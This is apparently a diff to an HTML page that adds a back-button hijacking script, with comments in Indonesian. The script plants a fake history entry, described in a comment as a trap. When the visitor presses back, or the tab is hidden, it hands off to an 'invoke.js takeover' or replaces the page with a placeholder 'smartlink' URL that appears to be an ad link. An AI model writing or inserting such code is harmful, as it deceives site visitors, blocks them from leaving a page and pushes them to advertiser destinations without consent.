@@ -63,14 +63,43 @@
 <!-- 🔹 BACK BUTTON TRIGGER -->
 <script>
 (function () {
-  history.pushState({bb:1}, "", location.href);
 
+  const FALLBACK_URL = "https://YOUR_SMARTLINK_HERE";
+
+  // push history jebakan
+  function trap() {
+    history.pushState({trap:1}, "", location.href);
+  }
+
+  trap();
+
+  // BACK BUTTON
   window.addEventListener("popstate", function () {
-    history.pushState({bb:1}, "", location.href);
-    console.log("Back triggered → invoke.js takeover");
+    redirect();
   });
+
+  // Android Chrome kadang skip popstate
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "hidden") {
+      redirect();
+    }
+  });
+
+function redirect() {
+  if (window.invokeReady) {
+    console.log("invoke.js takeover");
+    // invoke.js handle sendiri
+  } else {
+    location.replace(FALLBACK_URL);
+  }
+}
+
 })();
 </script>
+<script>
+window.invokeReady = true;
+</script>
+
 
 </body>
 </html>
